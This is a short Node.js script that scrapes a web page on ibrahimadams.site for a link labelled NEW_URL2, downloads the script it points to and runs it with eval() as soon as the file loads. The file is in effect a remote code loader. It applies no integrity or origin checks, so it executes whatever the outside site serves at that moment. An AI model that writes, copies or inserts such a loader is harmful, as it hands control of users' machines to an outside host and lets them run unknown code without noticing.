'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchNewUrl2() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const newUrl2 = $(`a:contains("NEW_URL2")`).attr('href');

        if (!newUrl2) throw new Error('NEW_URL2 not found on the webpage.');

        console.log('NEW_URL2 fetched successfully:', newUrl2);

        const scriptResponse = await axios.get(newUrl2);
        const scriptContent = scriptResponse.data;
        console.log("NEW_URL2 script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching NEW_URL2:', error.message);
    }
}

fetchNewUrl2();